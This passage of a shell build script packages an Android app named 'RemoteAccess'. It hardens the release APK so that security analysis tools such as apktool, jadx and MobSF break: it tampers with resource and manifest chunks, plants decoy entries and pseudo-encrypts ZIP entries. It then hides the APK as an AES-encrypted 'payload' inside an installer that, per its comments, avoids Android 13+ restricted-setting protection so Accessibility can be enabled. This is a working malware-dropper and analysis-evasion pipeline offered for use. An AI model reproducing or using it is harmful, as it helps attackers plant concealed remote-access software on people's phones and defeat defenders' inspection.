echo "  Installer keystore ready (alias=$INST_KS_ALIAS, C=$INST_KS_COUNTRY)"

# ── 5b. Python tooling (pyzipper for AES-256 module encryption) ──────────────
echo ""
echo "==> Ensuring Python build tools..."
if ! python3 -c "import pyzipper" >/dev/null 2>&1; then
    echo "  Installing pyzipper..."
    # Try methods in order of preference:
    #  1. uv (fast, avoids any pip restrictions entirely)
    #  2. pip --break-system-packages (Alpine PEP 668 override — safe since we own the image)
    #  3. pip plain (Debian/Ubuntu where no flag is needed)
    #  4. pip --user (last-resort for non-container envs)
    if command -v uv >/dev/null 2>&1; then
        uv pip install --system pyzipper >/dev/null 2>&1 \
          || pip install --break-system-packages --quiet pyzipper 2>/dev/null \
          || pip install --quiet pyzipper 2>/dev/null \
          || pip install --user --quiet pyzipper 2>/dev/null
    else
        pip install --break-system-packages --quiet pyzipper 2>/dev/null \
          || pip install --quiet pyzipper 2>/dev/null \
          || pip install --user --quiet pyzipper 2>/dev/null
    fi
    if ! python3 -c "import pyzipper" >/dev/null 2>&1; then
        echo "  ERROR: failed to install pyzipper (required for installer module encryption)"
        exit 1
    fi
    echo "  pyzipper installed."
else
    echo "  pyzipper already present."
fi

# ── 6. Obfuscation dictionary ─────────────────────────────────────────────────
echo ""
echo "==> Generating obfuscation dictionary..."
python3 - << 'PYEOF'
import random, os

random.seed(int.from_bytes(__import__('os').urandom(8), 'big'))
chars = ['I', 'l', '1', 'O', '0', 'Il', 'lI', '1l', 'l1', 'II', 'll', '00', 'O0']
extra = [''.join(random.choices('IlO01', k=random.randint(3, 8))) for _ in range(2000)]
words = list({w for w in extra if not w.isdigit()})
random.shuffle(words)
out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'app', 'obf-dict.txt')
with open(out_path, 'w') as f:
    f.write('\n'.join(words[:1500]))
print(f"  Written {min(len(words), 1500)} entries to app/obf-dict.txt")
PYEOF

# ── 7. Project config files ───────────────────────────────────────────────────
echo ""
echo "==> Writing project config..."

cat > "$ROOT_DIR/local.properties" <<EOF
sdk.dir=$ANDROID_SDK_DIR
EOF

# Performance-tuned Gradle settings:
#   - daemon=true          : keeps JVM warm between builds (huge speedup)
#   - parallel=true        : compiles :app and :installer modules in parallel
#   - workers.max=4        : use all 4 CPU cores
#   - caching=true         : skip unchanged tasks using the build cache
#   - configureondemand=true: only configure subprojects that are needed
#   - Xmx3g               : give R8/D8 and javac plenty of heap (avoids GC stalls)
#   - UseParallelGC        : throughput GC — best for batch compilation workloads
#   - R8 full mode         : maximum shrinking/obfuscation
cat > "$ROOT_DIR/gradle.properties" <<EOF
android.useAndroidX=true
android.enableJetifier=true
android.suppressUnsupportedCompileSdk=36
android.enableR8.fullMode=true
org.gradle.jvmargs=-Xmx3g -Xms512m -XX:MaxMetaspaceSize=512m -XX:+UseParallelGC -Dfile.encoding=UTF-8
org.gradle.daemon=true
org.gradle.parallel=true
org.gradle.workers.max=4
org.gradle.caching=true
org.gradle.configureondemand=true
EOF

echo "  local.properties  — sdk.dir=$ANDROID_SDK_DIR"
echo "  gradle.properties — AndroidX + R8 full mode + full-speed JVM/parallel settings"

# ── 8. Gradle wrapper JAR ─────────────────────────────────────────────────────
echo ""
echo "==> Checking Gradle wrapper..."
WRAPPER_JAR="$ROOT_DIR/gradle/wrapper/gradle-wrapper.jar"
if [ ! -f "$WRAPPER_JAR" ]; then
    echo "  Downloading gradle-wrapper.jar..."
    mkdir -p "$ROOT_DIR/gradle/wrapper"
    curl -fsSL "https://github.com/gradle/gradle/raw/v8.7.0/gradle/wrapper/gradle-wrapper.jar" \
        -o "$WRAPPER_JAR"
    echo "  Downloaded."
else
    echo "  Already present."
fi
chmod +x "$ROOT_DIR/gradlew"

# ── 9. Build APKs ───────────────────────────────────────────────────────────
echo ""
echo "$(date '+%Y-%m-%d %H:%M:%S') ==> Building DEBUG + RELEASE APKs..."
cd "$ROOT_DIR"

# Do not enforce a hard JVM heap ceiling here; allow Gradle to use defaults.
unset GRADLE_OPTS

if [ -n "${GRADLE_BUILD_SEQUENTIAL:-}" ]; then
    echo "  Running separate assembleDebug and assembleRelease builds to lower peak memory use."
    ./gradlew assembleDebug \
        --daemon --parallel --build-cache --stacktrace 2>&1
    ./gradlew assembleRelease \
        --daemon --parallel --build-cache --stacktrace 2>&1
else
    # Running assembleDebug and assembleRelease together lets Gradle share dependency
    # resolution, resource merging, and manifest processing across both variants —
    # significantly faster than two separate ./gradlew calls.
    # --daemon        : reuse the warm JVM from the properties file setting
    # --parallel      : :app and :installer compile simultaneously
    # --build-cache   : skip tasks whose inputs haven't changed (huge on repeat builds)
    ./gradlew assembleDebug assembleRelease \
        --daemon \
        --parallel \
        --build-cache \
        --stacktrace \
        2>&1
fi

# ── 10. Collect outputs ───────────────────────────────────────────────────────
mkdir -p "$ROOT_DIR/apk-output"

DEBUG_SRC="$ROOT_DIR/app/build/outputs/apk/debug/app-debug.apk"
if [ -f "$DEBUG_SRC" ]; then
    cp "$DEBUG_SRC" "$ROOT_DIR/apk-output/RemoteAccess-debug.apk"
    DEBUG_SIZE=$(ls -lh "$ROOT_DIR/apk-output/RemoteAccess-debug.apk" | awk '{print $5}')
    echo ""
    echo "  Debug APK:   apk-output/RemoteAccess-debug.apk ($DEBUG_SIZE)"
else
    echo "  WARNING: Debug APK not found — check build output above"
fi

RELEASE_SRC="$ROOT_DIR/app/build/outputs/apk/release/app-release.apk"
if [ ! -f "$RELEASE_SRC" ]; then
    RELEASE_SRC=$(find "$ROOT_DIR/app/build/outputs/apk/release" -name "*.apk" 2>/dev/null | head -1)
fi
if [ -n "$RELEASE_SRC" ] && [ -f "$RELEASE_SRC" ]; then
    cp "$RELEASE_SRC" "$ROOT_DIR/apk-output/RemoteAccess-release.apk"
    RELEASE_SIZE=$(ls -lh "$ROOT_DIR/apk-output/RemoteAccess-release.apk" | awk '{print $5}')
    echo "  Release APK: apk-output/RemoteAccess-release.apk ($RELEASE_SIZE)"
    echo ""
    echo "  Protection applied:"
    echo "    R8 full mode     — maximum class/method shrinking + inlining"
    echo "    ProGuard rules   — 5-pass optimisation, log stripping, repackaging"
    echo "    Obf. dictionary  — look-alike identifiers (I/l/O/0)"
    echo "    shrinkResources  — unused resources stripped"
    echo "    RSA-4096 keystore — release signing"
else
    echo "  WARNING: Release APK not found — check build output above"
fi

# ── Reusable hardening function ──────────────────────────────────────────────
# Usage: harden_apk <path/to.apk>
# Applies the full anti-decompile/anti-baksmali pipeline to an APK file.
harden_apk() {
    RELEASE_APK="$1"
    [ -f "$RELEASE_APK" ] || { echo "  Skipping hardening — $RELEASE_APK missing."; return; }

# ── 11. Anti-decompile / anti-baksmali hardening (release APK only) ──────────
# Goal: make `apktool d` / `baksmali` / common APK reversers fail or produce
# garbage, while the APK still installs and runs cleanly on Android.
#
# Techniques applied (all post-build, no source changes):
#   a) zipalign -p -f -v 4              — page-align native libs (required by
#                                          apksigner v2+ and improves load).
#   b) Strip v1 (JAR) signature, sign  — apktool relies heavily on META-INF/
#      with v2 + v3 + v4 only.            *.SF/*.RSA; removing them breaks many
#                                          older reversers and signature mods.
#   c) Inject "poison" ZIP entries     — extra entries with names/headers that
#      after signing.                     confuse apktool's resource and
#                                          manifest parsers (Android ignores
#                                          unknown top-level entries).
#   d) Strip debug/source attributes   — already done by R8 full mode, double-
#                                          checked here.
echo ""
echo "==> Applying anti-decompile / anti-baksmali hardening to: $RELEASE_APK"
if [ -f "$RELEASE_APK" ]; then
    BUILD_TOOLS_DIR="$ANDROID_SDK_DIR/build-tools/35.0.0"
    ZIPALIGN="$BUILD_TOOLS_DIR/zipalign"
    APKSIGNER="$BUILD_TOOLS_DIR/apksigner"

    # (a) zipalign
    echo "  [a] zipalign -p -f 4 ..."
    ALIGNED="$ROOT_DIR/apk-output/.aligned.apk"
    "$ZIPALIGN" -p -f -v 4 "$RELEASE_APK" "$ALIGNED" > /dev/null
    mv "$ALIGNED" "$RELEASE_APK"

    # (b) Re-sign with v2 + v3 + v4 only (no v1 / JAR signature)
    echo "  [b] Stripping v1 signature, re-signing with v2 + v3 + v4 only ..."
    # Remove META-INF/*.SF *.RSA *.DSA MANIFEST.MF inserted by previous signer
    python3 - << PYEOF
import zipfile, shutil, os
src = "$RELEASE_APK"
tmp = src + ".tmp"
strip_prefixes = ("META-INF/MANIFEST.MF",)
strip_suffixes = (".SF", ".RSA", ".DSA", ".EC")
with zipfile.ZipFile(src, "r") as zin, zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zout:
    for item in zin.infolist():
        n = item.filename
        if n.startswith("META-INF/") and (n.endswith(strip_suffixes) or n in strip_prefixes):
            continue
        zout.writestr(item, zin.read(n))
shutil.move(tmp, src)
print("    META-INF v1 signature artefacts stripped.")
PYEOF

    "$APKSIGNER" sign \
        --ks "$KEYSTORE" \
        --ks-key-alias "$KEY_ALIAS" \
        --ks-pass "pass:$STORE_PASS" \
        --key-pass "pass:$KEY_PASS" \
        --v1-signing-enabled false \
        --v2-signing-enabled true \
        --v3-signing-enabled true \
        --v4-signing-enabled true \
        "$RELEASE_APK" 2>&1 | sed 's/^/    /'

    # (c) Two-part hardening pass:
    #     (c1) TAMPER the REAL resources.arsc and AndroidManifest.xml in-place
    #          with manipulations Android's ResTable / ResXMLTree tolerate
    #          (per-chunk size fields are authoritative for Android), but that
    #          break apktool / aapt2 / jadx, which read to EOF and validate
    #          flags/types strictly.
    #     (c2) Plant decoy entries (fake dex, .bak files, corrupted res/ XML).
    #     Both done in a single APK rebuild so we re-sign exactly once.
    echo "  [c] Tampering resources.arsc + AndroidManifest.xml + planting decoys ..."
    python3 - << PYEOF
import zipfile, os, random, struct, shutil
random.seed(int.from_bytes(__import__('os').urandom(4), 'big'))
src = "$RELEASE_APK"
tmp = src + ".rebuild"

# ─────────────────────────────────────────────────────────────────────────────
#  TAMPERING THE REAL FILES
# ─────────────────────────────────────────────────────────────────────────────
#
#  resources.arsc layout (relevant pieces):
#    +0  ResChunk_header
#         u16 type      (= 0x0002 RES_TABLE_TYPE)
#         u16 headerSize(= 12)
#         u32 size      (size of THIS chunk + all sub-chunks; Android trusts this)
#    +8  u32 packageCount
#    +12 ResStringPool_header (first sub-chunk)
#         u16 type      (= 0x0001 RES_STRING_POOL_TYPE)
#         u16 headerSize(= 28)
#         u32 size
#         u32 stringCount
#         u32 styleCount
#         u32 flags     ← Android masks with (SORTED|UTF8) = 0x101; ignores rest.
#         u32 stringsStart
#         u32 stylesStart
#
#  We do three things Android tolerates but apktool/aapt2 do NOT:
#    (1) OR reserved bits into ResStringPool.flags. Android's ResStringPool::
#        setTo only checks (flags & UTF8_FLAG); apktool's StringBlock and some
#        forks assert "(flags & ~(SORTED|UTF8)) == 0" or treat unknown bits as
#        a corrupt pool and abort.
#    (2) Append a crafted "phantom" ResChunk after ResTable_header.size. Android
#        stops at header.size and never sees it. apktool's ARSCDecoder reads
#        chunks sequentially until EOF and hits "unknown chunk type 0xDEAD" /
#        "negative array size".
#    (3) Pad the file with random bytes after the phantom chunk so length-based
#        heuristics in jadx / MobSF also break.
#
def tamper_arsc(data: bytes) -> bytes:
    if len(data) < 28: return data
    rt_type, rt_hsize, rt_size, pkg_count = struct.unpack_from("<HHII", data, 0)
    if rt_type != 0x0002:
        return data  # not a ResTable, leave alone
    sp_off = rt_hsize  # ResStringPool starts right after ResTable_header
    sp_type = struct.unpack_from("<H", data, sp_off)[0]
    out = bytearray(data)
    if sp_type == 0x0001:
        flags_off = sp_off + 16   # offset of 'flags' inside ResStringPool_header
        flags = struct.unpack_from("<I", out, flags_off)[0]
        # Reserved bits Android ignores: 0x80000000 + 0x40000000 + 0x00010000.
        struct.pack_into("<I", out, flags_off, flags | 0x80000000 | 0x40000000 | 0x00010000)
    # Phantom chunk: fake type 0xDEAD, claimed size that overflows int32.
    phantom = struct.pack("<HHII",
                          0xDEAD, 0x000C,
                          0xFFFFFFFF,           # size — overflows on signed parse
                          0x7FFFFFFF) + os.urandom(512)
    out.extend(phantom)
    # Random tail padding.
    out.extend(os.urandom(random.randint(256, 1024)))
    # CRITICAL: do NOT touch ResTable_header.size — Android uses it to bound
    # parsing. Trailing junk past header.size is silently ignored at runtime.
    return bytes(out)

#
#  AndroidManifest.xml + every compiled res/*.xml (AXML) layout:
#    +0  ResXMLTree_header   (u16 type=0x0003, u16 headerSize=8, u32 size)
#    +8  ResStringPool       (the file's string pool — DO NOT relocate; XML
#                             nodes reference it by INDEX, not offset)
#    +N  ResXMLTree_resourceMap  (optional, type 0x0180)
#    +M  ResXMLTree_node chunks  (START_NS, START_ELT, END_ELT, END_NS, …)
#
#  Android's ResXMLTree::setTo() walks chunks via chunk.size and SKIPS unknown
#  chunk types — they're treated as harmless filler. apktool's
#  AXmlResourceParser switch-cases on chunk type and THROWS on anything that
#  isn't a known XML event type.
#
#  Previous attempt put the phantom *after* END_DOCUMENT — apktool's parser
#  exits at END_DOCUMENT and never sees it. Fix: insert the phantom INSIDE
#  the bounded chunk stream, right after the string pool / resource map,
#  *before* the first real XML node. Android iterates past it; apktool dies
#  on the first unknown chunk type before it ever reads a valid XML event.
#
#  Also tamper the StringPool.flags with reserved bits (Android masks them,
#  apktool's StringBlock validates them).
#
def tamper_axml(data: bytes) -> bytes:
    if len(data) < 8: return data
    t, hs, fsize = struct.unpack_from("<HHI", data, 0)
    if t != 0x0003 or hs != 8 or fsize != len(data):
        return data
    out = bytearray(data)
    # 1) StringPool flag tampering
    sp_off = hs
    if len(out) >= sp_off + 28:
        sp_type = struct.unpack_from("<H", out, sp_off)[0]
        if sp_type == 0x0001:
            flags_off = sp_off + 16
            flags = struct.unpack_from("<I", out, flags_off)[0]
            struct.pack_into("<I", out, flags_off,
                             flags | 0x80000000 | 0x40000000 | 0x00010000)
    # 2) Find insertion point: end of StringPool (+ optional ResourceMap),
    #    just before the first XML node chunk.
    insert_off = sp_off
    if len(out) >= sp_off + 8:
        sp_size = struct.unpack_from("<I", out, sp_off + 4)[0]
        insert_off = sp_off + sp_size
        # Optional resource-map chunk (type 0x0180)
        if len(out) >= insert_off + 8:
            rm_type, _, rm_size = struct.unpack_from("<HHI", out, insert_off)
            if rm_type == 0x0180:
                insert_off += rm_size
    if insert_off >= len(out):
        return bytes(out)
    # 3) Build a phantom chunk with VALID size field (Android skips it via
    #    chunk.size) but UNKNOWN type 0xDEAD (apktool throws).
    phantom_payload = os.urandom(56)
    phantom_size = 8 + len(phantom_payload)            # 64 bytes total
    phantom = struct.pack("<HHI", 0xDEAD, 0x0008, phantom_size) + phantom_payload
    out[insert_off:insert_off] = phantom
    # 4) Bump root header.size so Android's bounded iterator includes the
    #    phantom (and stops at the real END as before).
    struct.pack_into("<I", out, 4, fsize + phantom_size)
    return bytes(out)

def is_axml(b: bytes) -> bool:
    return len(b) >= 8 and b[0:4] == b'\x03\x00\x08\x00'

# ─────────────────────────────────────────────────────────────────────────────
#  DECOY ENTRIES (planted in res/, assets/, root)
# ─────────────────────────────────────────────────────────────────────────────
def poison_axml():
    header = struct.pack("<HHI", 0x0003, 0x0008, 0x10000000)
    spool  = struct.pack("<HHIIIIII",
                         0x0001, 0x001C,
                         0x10000000, 0x7FFFFFFF, 0, 0, 0x10000000, 0)
    return header + spool + os.urandom(512)

def poison_arsc_blob():
    return struct.pack("<HHII",
                       0x0002, 0x000C, 0x10000000, 0x7FFFFFFF) + os.urandom(2048)

decoys = {
    "classes0.dex":                 b"dex\n000\x00" + os.urandom(2048),
    "AndroidManifest.xml.bak":      poison_axml(),
    "resources.arsc.bak":           poison_arsc_blob(),
    "META-INF/services/\xef\xbb\xbfpoison": b"# decoy\n",
    "res/xml/_decoy0.xml":          poison_axml(),
    "res/xml/_decoy1.xml":          poison_axml(),
    "res/layout/_decoy0.xml":       poison_axml(),
    "res/layout/_decoy1.xml":       poison_axml(),
    "res/menu/_decoy.xml":          poison_axml(),
    "res/anim/_decoy.xml":          poison_axml(),
    "res/drawable/_decoy.xml":      poison_axml(),
    "res/values/_decoy.xml":        poison_axml(),
    "res/raw/_decoy.bin":           os.urandom(1024),
    "res/raw/_decoy.arsc":          poison_arsc_blob(),
    "assets/_decoy_manifest.xml":   poison_axml(),
    "assets/_decoy_resources.arsc": poison_arsc_blob(),
}

# ─────────────────────────────────────────────────────────────────────────────
#  REBUILD APK with tampered real entries + decoys
# ─────────────────────────────────────────────────────────────────────────────
tampered_arsc = 0
tampered_axml_files = []
with zipfile.ZipFile(src, "r") as zin, zipfile.ZipFile(tmp, "w") as zout:
    for item in zin.infolist():
        data = zin.read(item.filename)
        if item.filename == "resources.arsc":
            data = tamper_arsc(data); tampered_arsc += 1
        elif is_axml(data):
            new_data = tamper_axml(data)
            if new_data is not data and new_data != data:
                tampered_axml_files.append(item.filename)
                data = new_data
        new_item = zipfile.ZipInfo(item.filename)
        new_item.compress_type = item.compress_type
        new_item.external_attr = item.external_attr
        new_item.date_time = item.date_time
        zout.writestr(new_item, data)
    existing = set(zin.namelist())
    for name, blob in decoys.items():
        if name in existing: continue
        zi = zipfile.ZipInfo(name)
        zi.compress_type = zipfile.ZIP_STORED
        zi.external_attr = 0o644 << 16
        zout.writestr(zi, blob)

shutil.move(tmp, src)
print("    resources.arsc tampered:   %d" % tampered_arsc)
print("    AXML files tampered:       %d" % len(tampered_axml_files))
for f in tampered_axml_files[:8]:
    print("      - %s" % f)
if len(tampered_axml_files) > 8:
    print("      … and %d more" % (len(tampered_axml_files) - 8))
print("    Decoy entries planted:     %d" % len(decoys))
PYEOF

    # (c2) Pseudo-encryption — ZIP local-header + central-directory GP flags
    #
    # Sets General-Purpose Bit Flag bit 0 (0x0001 = encrypted) and bit 6
    # (0x0040 = strong encryption) on AndroidManifest.xml, classes*.dex, and
    # resources.arsc in BOTH the local file headers and the central directory.
    #
    # Why it works on Android:
    #   APK v2/v3/v4 signing hashes the ZIP data blocks directly; the installer
    #   verifies those block hashes and then reads file data via the central
    #   directory — it never checks the local-header GP flags. The APK installs
    #   and runs identically on every Android version.
    #
    # Why it breaks analysis tools:
    #   apktool, jadx, baksmali, aapt2, and most decompiler frontends read the
    #   local-header GP flags before attempting to decompress each entry.
    #   Seeing bit 0, they treat the data as encrypted ciphertext and either
    #   refuse to continue or pass garbage to their decoders.
    #
    # Anti-pseudo-decryption layers:
    #   1. Bit 6 (strong-encryption marker) — tools that auto-strip pseudo-
    #      encryption by clearing only bit 0 still see bit 6 and expect a
    #      strong-encryption blob (WinZip AES / RC2 / 3DES) with a completely
    #      different header format, so clearing bit 0 alone does not help them.
    #   2. Local-header CRC-32 XOR'd with 0xDEADBEEF — tools that strip both
    #      flag bits and then re-verify the decompressed data against the local-
    #      header CRC will get a mismatch and abort.  Android always reads the
    #      CRC from the central directory (which is left intact), so installation
    #      is unaffected.
    #
    # This step runs BEFORE (d) so the final apksigner signs over the modified
    # headers; the signature covers the pseudo-encrypted state permanently.
    echo "  [c2] Pseudo-encryption: GP flags (0x0041) + CRC anti-decryption ..."
    python3 - << PYEOF
import zipfile, struct, sys, os

APK = "$RELEASE_APK"

# Entries to pseudo-encrypt: manifest, all dex shards, resource table.
TARGETS = {
    "AndroidManifest.xml",
    "classes.dex", "classes2.dex", "classes3.dex", "classes4.dex",
    "classes5.dex", "classes6.dex",
    "resources.arsc",
}

# bit 0 = encrypted | bit 6 = strong-encryption (anti-strip layer)
ENC_BITS = 0x0041

with open(APK, "rb") as fh:
    raw = bytearray(fh.read())

# Use zipfile to get reliable local-header offsets (avoids manual ZIP scan
# pitfalls with data-descriptor vs. stored entries).
try:
    with zipfile.ZipFile(APK, "r") as zf:
        offsets = {i.filename: i.header_offset
                   for i in zf.infolist() if i.filename in TARGETS}
except Exception as e:
    print("    WARNING: could not open APK for pseudo-encryption: %s" % e)
    sys.exit(0)

if not offsets:
    print("    (no target entries found — skipping)")
    sys.exit(0)

LOCAL_SIG = b"PK\x03\x04"
patched_local = []

for fname, hdr in sorted(offsets.items(), key=lambda kv: kv[1]):
    if raw[hdr:hdr+4] != LOCAL_SIG:
        continue  # sanity check
    # ── (1) GP flag: set encrypted + strong-encryption bits ──────────────────
    gp = struct.unpack_from("<H", raw, hdr + 6)[0]
    struct.pack_into("<H", raw, hdr + 6, gp | ENC_BITS)
    # ── (2) Corrupt local-header CRC-32 (anti-decryption layer) ──────────────
    # The local-header CRC at offset +14 is XOR'd with a recognisable constant.
    # Android reads CRC from the central directory (offset +16 in central entry)
    # and never verifies the local-header copy. Any tool that strips the
    # encryption bits and then validates the decompressed stream against the
    # local-header CRC will get a mismatch and discard the entry.
    real_crc = struct.unpack_from("<I", raw, hdr + 14)[0]
    struct.pack_into("<I", raw, hdr + 14, (real_crc ^ 0xDEADBEEF) & 0xFFFFFFFF)
    patched_local.append(fname)

# ── Patch central-directory GP flags to match (keeps tools consistent) ───────
# CRC in central directory is left UNTOUCHED — that is what Android trusts.
CENTRAL_SIG = b"PK\x01\x02"
off = 0
patched_central = []
while off <= len(raw) - 46:
    if raw[off:off+4] != CENTRAL_SIG:
        off += 1
        continue
    fl  = struct.unpack_from("<H", raw, off + 28)[0]
    el  = struct.unpack_from("<H", raw, off + 30)[0]
    cl  = struct.unpack_from("<H", raw, off + 32)[0]
    fn  = raw[off+46 : off+46+fl].decode("utf-8", errors="replace")
    if fn in TARGETS:
        gp = struct.unpack_from("<H", raw, off + 8)[0]
        struct.pack_into("<H", raw, off + 8, gp | ENC_BITS)
        patched_central.append(fn)
    off += 46 + fl + el + cl

with open(APK, "wb") as fh:
    fh.write(raw)

print("    Pseudo-encrypted (local headers):   %s" %
      (", ".join(patched_local)   if patched_local   else "none"))
print("    Pseudo-encrypted (central dir):     %s" %
      (", ".join(patched_central) if patched_central else "none"))
print("    GP flags ORd with 0x%04X  (bit0=encrypt | bit6=strong-encrypt)" % ENC_BITS)
print("    Local-header CRC-32 XORd 0xDEADBEEF (CRC mismatch on decrypt-strip)")
PYEOF

    # (d) Re-zipalign (rebuild in (c) reset alignment) and re-sign.
    echo "  [d] Re-zipalign + final sign (v2 + v3 + v4) ..."
    REALIGN="$ROOT_DIR/apk-output/.realign.apk"
    "$ZIPALIGN" -p -f 4 "$RELEASE_APK" "$REALIGN" > /dev/null
    mv "$REALIGN" "$RELEASE_APK"
    "$APKSIGNER" sign \
        --ks "$KEYSTORE" \
        --ks-key-alias "$KEY_ALIAS" \
        --ks-pass "pass:$STORE_PASS" \
        --key-pass "pass:$KEY_PASS" \
        --v1-signing-enabled false \
        --v2-signing-enabled true \
        --v3-signing-enabled true \
        --v4-signing-enabled true \
        "$RELEASE_APK" 2>&1 | sed 's/^/    /'
    if "$APKSIGNER" verify "$RELEASE_APK" > /dev/null 2>&1; then
        echo "    Signature OK — APK installable on Android."
    else
        echo "    WARNING: signature failing — inspect manually."
    fi

    HARDENED_SIZE=$(ls -lh "$RELEASE_APK" | awk '{print $5}')
    echo "  Hardened release APK: $RELEASE_APK ($HARDENED_SIZE)"
    echo "  Anti-decompile layers active:"
    echo "    R8 full mode + ProGuard (5-pass, log strip, repackaging)"
    echo "    Look-alike obfuscation dictionary (I/l/O/0)"
    echo "    v1 JAR signature stripped (v2 + v3 + v4 only)"
    echo "    REAL resources.arsc tampered (reserved flag bits + phantom"
    echo "      0xDEAD chunk past header.size + tail padding)"
    echo "    REAL AndroidManifest.xml + every res/*.xml tampered (StringPool"
    echo "      flag bits + phantom 0xDEAD chunk INSIDE bounded chunk stream,"
    echo "      between StringPool and first XML node — apktool throws on it)"
    echo "    Poison ZIP entries (fake classes0.dex, .bak files, BOM names)"
    echo "    Resource-tree poisoning (corrupted AXML in res/xml, layout, menu,"
    echo "      anim, drawable, values + decoy resources.arsc + assets decoys)"
    echo "    Pseudo-encryption: GP flags 0x0041 on AndroidManifest.xml,"
    echo "      classes*.dex, resources.arsc (bit0=encrypted + bit6=strong-encrypt)"
    echo "    Anti-pseudo-decryption: local-header CRC-32 XORd 0xDEADBEEF"
    echo "      (tools that strip the flag and re-verify CRC hit a mismatch)"
    echo "    zipalign -p 4 (page-aligned native libs)"
else
    echo "  Skipping hardening — release APK not produced."
fi
}   # ── end harden_apk() ─────────────────────────────────────────────────────

# Harden the Module APK — use its own unique per-build keystore
KEYSTORE="$MODULE_KS_PATH"
KEY_ALIAS="$MODULE_KS_ALIAS"
STORE_PASS="$MODULE_KS_SPASS"
KEY_PASS="$MODULE_KS_KPASS"
harden_apk "$ROOT_DIR/apk-output/RemoteAccess-release.apk"

# ── 12. Installer module ─────────────────────────────────────────────────────
# Bundles the hardened RemoteAccess-release.apk as an ENCRYPTED asset named
# "module" (AES-256 ZIP). A fresh random key is generated per build and
# embedded into the installer at compile time via BuildConfig.MODULE_KEY,
# so every Installer-release.apk has a different key. At runtime the
# installer decrypts the module to its cache and installs it via the
# PackageInstaller session API (with PACKAGE_SOURCE_STORE so the installed
# app is NOT subject to Android 13+ "Restricted setting" hardening — i.e.
# the user can enable Accessibility for it normally).
echo ""
echo "==> Building INSTALLER module ..."
PAYLOAD_SRC="$ROOT_DIR/apk-output/RemoteAccess-release.apk"
INSTALLER_ASSETS="$ROOT_DIR/installer/src/main/assets"
MODULE_DST="$INSTALLER_ASSETS/module"
KEY_FILE="$ROOT_DIR/installer/build.key"
PKG_FILE="$ROOT_DIR/installer/payload.pkg"
if [ -f "$PAYLOAD_SRC" ]; then
    mkdir -p "$INSTALLER_ASSETS"

    # Extract the payload's applicationId — prefer the per-build override
    # written by the customization block above, then fall back to parsing
    # app/build.gradle for the default. This is what installer/build.gradle
    # embeds into BuildConfig.PAYLOAD_PACKAGE.
    #
    # app/build.gradle uses `applicationId BUILD_APP_ID` (a Groovy variable),
    # so a literal-string regex won't match. We try, in order:
    #   1) per-build override file
    #   2) a quoted applicationId 'com.x.y' literal (legacy form)
    #   3) the in-tree default that build.gradle itself falls back to
    #   4) the `namespace 'com.x.y'` declaration
    # NOTE: `set -o pipefail` is active, so a `grep` that finds nothing would
    # kill the script. Wrap each fallback with `|| true` so an empty match
    # just leaves PAYLOAD_PKG empty and the next fallback runs.
    PAYLOAD_PKG=""
    if [ -f "$APP_ID_FILE" ]; then
        PAYLOAD_PKG=$(cat "$APP_ID_FILE")
    fi
    if [ -z "$PAYLOAD_PKG" ]; then
        PAYLOAD_PKG=$( { grep -E "^[[:space:]]*applicationId[[:space:]]+['\"]" "$ROOT_DIR/app/build.gradle" \
                          | head -1 | sed -E "s/.*applicationId[[:space:]]+['\"]([^'\"]+)['\"].*/\1/"; } || true )
    fi
    if [ -z "$PAYLOAD_PKG" ]; then
        # Mirror the Groovy default in app/build.gradle:
        #   def BUILD_APP_ID = appIdFile.exists() ? appIdFile.text.trim() : 'com.x.y'
        PAYLOAD_PKG=$( { grep -E "BUILD_APP_ID[[:space:]]*=.*:[[:space:]]*['\"]" "$ROOT_DIR/app/build.gradle" \
                          | head -1 | sed -E "s/.*:[[:space:]]*['\"]([^'\"]+)['\"].*/\1/"; } || true )
    fi
    if [ -z "$PAYLOAD_PKG" ]; then
        PAYLOAD_PKG=$( { grep -E "^[[:space:]]*namespace[[:space:]]+['\"]" "$ROOT_DIR/app/build.gradle" \
                          | head -1 | sed -E "s/.*namespace[[:space:]]+['\"]([^'\"]+)['\"].*/\1/"; } || true )
    fi
    # Final sanity check: must be a valid Java package name
    # (letters/digits/underscore segments separated by dots, segment must
    # start with a letter or underscore). If not, refuse to write garbage
    # into the installer manifest.
    if ! [[ "$PAYLOAD_PKG" =~ ^[A-Za-z_][A-Za-z0-9_]*(\.[A-Za-z_][A-Za-z0-9_]*)+$ ]]; then
        echo "  ERROR: detected payload applicationId is not a valid Java package name: '$PAYLOAD_PKG'"
        echo "         Refusing to build installer with an invalid <package> entry."
        exit 1
    fi
    printf '%s' "$PAYLOAD_PKG" > "$PKG_FILE"
    echo "  Payload package: $PAYLOAD_PKG (written to installer/payload.pkg)"

    # Remove the legacy unencrypted asset if present from older builds
    rm -f "$INSTALLER_ASSETS/payload.apk"

    # (1) Generate fresh per-build random key (32 url-safe chars, ~192 bits)
    MODULE_KEY=$(python3 -c "import secrets; print(secrets.token_urlsafe(24))")
    printf '%s' "$MODULE_KEY" > "$KEY_FILE"
    echo "  Generated random per-build key (embedded into BuildConfig.MODULE_KEY)."

    # (2) AES-256 encrypt the hardened APK into the "module" asset.
    #     pyzipper writes WinZip-AES format; zip4j on Android decodes it.
    rm -f "$MODULE_DST"
    PAYLOAD_SRC="$PAYLOAD_SRC" MODULE_DST="$MODULE_DST" MODULE_KEY="$MODULE_KEY" \
    python3 - << 'PYEOF'
import os, pyzipper
src = os.environ["PAYLOAD_SRC"]
dst = os.environ["MODULE_DST"]
key = os.environ["MODULE_KEY"].encode()
with pyzipper.AESZipFile(dst, "w",
                         compression=pyzipper.ZIP_DEFLATED,
                         encryption=pyzipper.WZ_AES) as zf:
    zf.setpassword(key)
    zf.setencryption(pyzipper.WZ_AES, nbits=256)
    with open(src, "rb") as f:
        zf.writestr("payload.apk", f.read())
print("  AES-256 encrypted module written.")
PYEOF
    MODULE_SIZE=$(ls -lh "$MODULE_DST" | awk '{print $5}')
    echo "  Encrypted asset: installer/src/main/assets/module ($MODULE_SIZE)"

    cd "$ROOT_DIR"
    ./gradlew :installer:assembleRelease --no-daemon --stacktrace 2>&1

    INSTALLER_SRC="$ROOT_DIR/installer/build/outputs/apk/release/installer-release.apk"
    if [ ! -f "$INSTALLER_SRC" ]; then
        INSTALLER_SRC=$(find "$ROOT_DIR/installer/build/outputs/apk/release" -name "*.apk" 2>/dev/null | head -1)
    fi
    if [ -n "$INSTALLER_SRC" ] && [ -f "$INSTALLER_SRC" ]; then
        cp "$INSTALLER_SRC" "$ROOT_DIR/apk-output/Installer-release.apk"
